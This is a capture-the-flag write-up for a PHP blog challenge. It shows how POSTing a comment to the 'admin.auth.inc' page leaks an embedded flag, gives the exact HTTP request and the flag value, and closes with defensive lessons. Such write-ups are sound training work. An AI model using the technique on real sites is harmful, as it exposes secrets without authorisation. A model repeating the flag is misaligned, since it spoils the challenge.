Category: Web Security
Level: Moderate
Objective: Find hidden flags through web vulnerabilities
Description: PHP blog application with comment system and admin panel

[RECONNAISSANCE]
----------------
Comment system allows POST to any page via ?page= parameter.
Form submits to current page with body parameter.

Tested comment submission on home page:
POST / HTTP/2
body=test

Response: "Comment submitted and awaiting approval!"

[VULNERABILITY DISCOVERY]
-------------------------
Information Disclosure via comment processing on admin.auth.inc page.
Flag stored in page code is leaked in POST response.

[EXPLOITATION]
--------------
Submit comment on admin login page:

POST /?page=admin.auth.inc HTTP/2
Content-Type: application/x-www-form-urlencoded

body=test

[EVIDENCE]
----------
Response HTML:
<p>^FLAG^8ec3969588201c6aa741ee2246b136cef4a4ce3ae7d91bca846b90aab157a0b8$FLAG$</p>
<p>Comment submitted and awaiting approval!</p>

FLAG #2: ^FLAG^8ec3969588201c6aa741ee2246b136cef4a4ce3ae7d91bca846b90aab157a0b8$FLAG$

Flag appears in POST response before comment approval.
Not visible in subsequent GET requests to same page.

[LESSONS LEARNED]
-----------------
- Never store secrets/flags directly in application code
- Use environment variables for sensitive data
- Clear output buffers before sending responses
- Information disclosure can occur in unexpected operations (POST responses)
- Separate business logic from data exposure paths
